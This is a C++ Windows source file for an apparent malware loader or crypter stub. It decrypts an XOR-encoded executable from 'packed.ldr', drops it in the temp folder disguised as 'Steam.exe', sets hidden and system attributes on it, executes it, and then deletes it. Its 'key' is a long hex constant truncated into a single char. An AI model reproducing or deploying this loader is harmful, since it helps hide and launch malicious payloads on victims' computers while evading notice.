#include <iostream>
#include <fstream>
#include <vector>
#include <windows.h>
#include <cstdlib>

using namespace std;

void xor_encrypt_decrypt(vector<char>& data, char key) {
    for (size_t i = 0; i < data.size(); ++i) {
        data[i] ^= key;
    }
}

bool read_file(const string& filename, vector<char>& data) {
    ifstream file(filename, ios::binary);
    if (!file) {
        cerr << "Unable to open packed PE. " << endl;
        return false;
    }

    file.seekg(0, ios::end);
    size_t size = file.tellg();
    file.seekg(0, ios::beg);

    data.resize(size);
    file.read(data.data(), size);
    file.close();
    return true;
}

void save_encrypted_file(const wstring& filename, const vector<char>& data) {
    ofstream file(filename, ios::binary);
    file.write(data.data(), data.size());
    file.close();
}

void set_file_hidden_system(const wstring& filename) {
    DWORD file_attributes = GetFileAttributesW(filename.c_str());

    if (file_attributes == INVALID_FILE_ATTRIBUTES) {
        wcerr << L"Packed file not found " << endl;
        return;
    }

    file_attributes |= (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    if (!SetFileAttributesW(filename.c_str(), file_attributes)) {
        wcerr << L"Failed to set file as hidden. " << endl;
    }
    else {
        
    }
}

void delete_temp_file(const wstring& temp_filename) {
    if (DeleteFileW(temp_filename.c_str())) {
      
    }
    else {
        wcerr << L"Packed file could not be deleted"<< endl;
    }
}

void run_encrypted_pe(const string& encrypted_filename, char key, const wstring& temp_filename) {
    vector<char> data;
    if (!read_file(encrypted_filename, data)) {
        cerr << "Unable to open packed file!" << endl;
        return;
    }

    xor_encrypt_decrypt(data, key);
    save_encrypted_file(temp_filename, data);

  
    set_file_hidden_system(temp_filename);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (CreateProcessW(
        nullptr,
        const_cast<wchar_t*>(temp_filename.c_str()),
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        delete_temp_file(temp_filename);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        wcerr << L"Unable to run file!" << endl;
    }
}

int main() {
    string encrypted_filename = "packed.ldr"; // Encrypted PE...
    char key = 0x2038642379ACBFD;

    char temp_path[MAX_PATH];
    DWORD path_len = GetTempPathA(MAX_PATH, temp_path);
    if (path_len == 0) {
        cerr << "Error getting temp directory" << endl;
        return -1;
    }

    wstring global_temp_filename = wstring(temp_path, temp_path + path_len) + L"Steam.exe";

    run_encrypted_pe(encrypted_filename, key, global_temp_filename);

    return 0;
}
